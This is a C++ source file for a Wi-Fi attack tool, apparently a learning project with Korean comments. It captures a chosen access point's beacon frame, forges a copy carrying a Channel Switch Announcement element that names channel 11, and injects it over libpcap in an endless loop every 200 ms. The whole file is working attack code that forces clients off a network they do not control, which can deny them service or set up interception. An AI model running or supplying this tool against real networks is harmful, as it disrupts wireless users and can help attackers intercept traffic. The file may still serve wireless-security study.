#include "mac.h"
#include "pch.h"
#include "handler.h"
#include "macframe.h"
#include "management.h"
#include "ie.h"
#include "radiotap.h"
#include "config.h"


void usage()
{
    std::cout << "Usage: ./csa <interface> <ap_mac> " << std::endl;
}

int check_args(int argc, char* argv[])
{
    if (argc != 3) {
        usage();
        return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}



int main(int argc, char* argv[]) {
    if (check_args(argc, argv) == EXIT_FAILURE) {
        return EXIT_FAILURE ;
    }
    //==========Config initialization==========

    Config config;
    config.interface = argv[1];
    config.ap_mac = Mac(argv[2]);

    //==========PCAP initialization==========

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = handle_init(config.interface.c_str(), errbuf);
    if(pcap == nullptr) 
    {
        return EXIT_FAILURE;
    }
    //=========Find target AP's beacon frame=========
    
    const u_char* packet;
    int total_packet_len, packet_len;
    ieee80211_radiotap_header* radiotap_header = nullptr;
    packet = find_target_beacon(pcap, &config, &total_packet_len, &radiotap_header);
    packet_len = total_packet_len - radiotap_header->it_len ;
    ieee80211_mac_header* mac_header = (ieee80211_mac_header*)packet;
    
    std::cout << "Total Packet Length (with Radiotap): " << total_packet_len << std::endl;
    std::cout << "802.11 Packet Length (without Radiotap): " << packet_len << std::endl;

    dump(packet, packet_len);
    std::cout << "========================" << std::endl;

    //=========Make CSA frame=========

    std::cout << "Current Channel: " << config.ap_current_channel << std::endl;
    int switchChannel = setSwitchChannel(config.ap_current_channel);
    channel_switch_announcement_ie csa_ie = create_channel_switch_announcement_ie(11, 3); // 11번 채널 고정

    //=========Parse beacon frame body=========
    beacon_frame_body* frame_body = (beacon_frame_body*)(packet + sizeof(ieee80211_mac_header));

    //TODO : Beacon 타임스탬프 설정

    //TODO : Beacon Interval 설정

    //Beacon Frame Body에서 IE 순회하면서 CSA IE 삽입할 위치 확인
    const uint8_t* ptr = packet + sizeof(ieee80211_mac_header) + sizeof(beacon_frame_body);
    const uint8_t* end = packet + packet_len;
    const uint8_t* insert_pos = nullptr;

    while (ptr + 2 <= end) 
    {
        uint8_t tag = ptr[0];
        uint8_t len = ptr[1];

        if (ptr + 2 + len > end) break; 

        if (tag == ieee80211_IE::SSID) 
        { // SSIDs보다 뒤에 삽입해야하므로 SSID IE 발견 시점에서 삽입 위치 설정
            insert_pos = ptr + 2 + len; // "뒤"에 삽입
            break;
        }
        ptr += 2 + len;
    }

    //============================= 패킷 생성 =============================

    // FCS 제거된 802.11 길이
    int body_len = packet_len - 4;

    // 전체 길이 = radiotap + mac_frame_header + CSA  + body
    int new_packet_len = radiotap_header->it_len + body_len + sizeof(csa_ie);
    u_char* new_packet = new u_char[new_packet_len];

    //라디오 헤더 복사
    memcpy(new_packet, radiotap_header, radiotap_header->it_len);

    // 맥 프레임 기준 시작 위치
    u_char* dst = new_packet + radiotap_header->it_len;

    // CSA 삽입 위치까지 앞부분 복사
    size_t front_len = insert_pos - packet;
    memcpy(dst, packet, front_len);

    // CSA 삽입
    memcpy(dst + front_len, &csa_ie, sizeof(csa_ie));

    // CSA 이후 복사
    size_t back_len = body_len - front_len;
    memcpy(dst + front_len + sizeof(csa_ie), insert_pos, back_len);
    dump(new_packet, new_packet_len);

    //=====================================================================

    //============CSA 프레임 송신 ===========
    int cnt = 1;
    while (true)
    {
        int res = pcap_sendpacket(pcap, new_packet, new_packet_len);
        if (res != 0) {
            std::cerr << "pcap_sendpacket error: " << pcap_geterr(pcap) << std::endl;
        }
        else{
            std::cout << "Sent CSA frame to AP " << cnt << ": " << (std::string)config.ap_mac << " to switch to channel " << (int)csa_ie.new_channel_number << std::endl;
        }
        cnt++;
        usleep(200000); //1초마다 전송
    }

    delete[] new_packet;
    return 0;
}